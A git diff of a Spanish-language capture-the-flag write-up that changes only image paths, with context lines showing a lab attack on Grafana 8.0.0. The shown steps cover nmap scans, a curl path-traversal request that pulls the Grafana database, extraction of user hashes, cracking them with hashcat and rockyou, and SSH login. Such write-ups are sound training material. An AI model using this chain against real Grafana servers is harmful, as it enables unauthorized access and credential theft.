@@ -13,21 +13,21 @@ tags: ['Grafana', 'docker', 'Path traversal']
 ```
 
 Despues de un escaneo en nmap, veo los servicios abiertos: 
-![scan](public/data-machine/data-1.png)
+![scan](/data-machine/data-1.png)
 Para mas detalles de los puertos realizo un segundo escaneo
 ```
 nmap -p 22,3000 -sCV 10.129.234.47
 ```
-![secondscan](public/data-machine/segundonmap.png)
+![secondscan](/data-machine/segundonmap.png)
 
 Entrando al server http://10.129.234.47:3000 veo el login de Grafana
 
-![[version](public/data-machine/versiongrafa.png)
+![[version](/data-machine/versiongrafa.png)
 Corriendo la version 8.0.0, buscando un poco el CVE 
 Encuentro que es vulnerable a un path traversal
 " The vulnerable URL path is: <grafana_host_url>/public/plugins//, where is the plugin ID for any installed plugin. ""
 
-![prueba](public/data-machine/path_traversal.png)
+![prueba](/data-machine/path_traversal.png)
 
 Que hace este comando? 
 - `http://10.129.61.130:3000/public/plugins/<plugin>/`  
@@ -51,7 +51,7 @@ curl --path-as-is "http://10.129.234.47:3000/public/plugins/mysql/../../../../..
 ```
 Veo la base de datos con sqlite3 
 
-![sqlit3](public/data-machine/sqlit3.png)
+![sqlit3](/data-machine/sqlit3.png)
 >Hint: Si lo ven  asi en columna y truncado solo usen `.mode line`
 
 Encuentro los hashes de dos usuarios, admin y boris y extraigo la password,salt:
@@ -63,7 +63,7 @@ Y uso [grafana2hashcat](https://github.com/iamaldi/grafana2hashcat), esta herram
 ```bash
 hashcat -m 10900 <tuhash.txt> --wordlist /usr/share/wordlists/rockyou.txt
 ```
-![rockyou](public/data-machine/rockyou.png)
+![rockyou](/data-machine/rockyou.png)
 
 Tenemos la contrasena, ahora entramos al ssh que tenia puerto abierto con las credenciales de boris.
 
